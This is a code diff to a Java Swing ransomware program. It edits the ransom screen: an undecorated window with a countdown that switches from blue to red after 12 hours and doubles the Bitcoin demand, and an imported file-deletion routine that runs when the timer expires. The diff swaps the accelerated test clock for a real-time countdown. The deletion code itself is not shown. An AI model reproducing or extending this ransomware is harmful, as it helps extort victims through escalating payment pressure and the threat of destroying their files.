@@ -6,7 +6,7 @@ import javax.swing.*;
 import java.awt.*;
 import java.text.DecimalFormat;
 
-//Ransomware screen
+//Ransomware screen (both stages)
 
 import static FileDeleter.FileDelete.FileDeleter;
 
@@ -47,7 +47,7 @@ public class GUI {
         frame.setTitle("");
         frame.setUndecorated(true);
         frame.setResizable(false);
-        cp.setBackground(Color.decode("#0068FF"));
+        cp.setBackground(Color.decode("#0068FF"));//original blue background
 
         try {
             ImageIcon originalIcon = new ImageIcon("JavaSwing/src/main/resources/Alien.png");
@@ -154,13 +154,16 @@ public class GUI {
     public void startCountdownTimer() {
         countdownTimer = new Timer(1000, e -> {
             Container cp = frame.getContentPane();
+            
             if (remainingMillis >= 43200000) {
+                //blue stage
                 cp.setBackground(Color.decode("#0068FF"));
             } else {
+                //red stage and increased demands
                 BitcoinDemand.setText("Pay " + (BitcoinDemands * 2) + " Bitcoin to the address below");
                 cp.setBackground(Color.decode("#ad0401"));
             }
-
+            //file deletion for testing
             if (remainingMillis <= 0) {
                 timerLabel.setText("00:00:00");
                 countdownTimer.stop();
@@ -178,7 +181,8 @@ public class GUI {
             DecimalFormat df = new DecimalFormat("00");
             timerLabel.setText(df.format(hours) + ":" + df.format(minutes) + ":" + df.format(seconds));
 
-            remainingMillis -= 3600000; // Simulated: 1 second = 1 hour
+            //remainingMillis -= 3600000;  Simulated: 1 second = 1 hour for testing
+            remainingMillis -= 1000;
         });
         countdownTimer.start();
     }
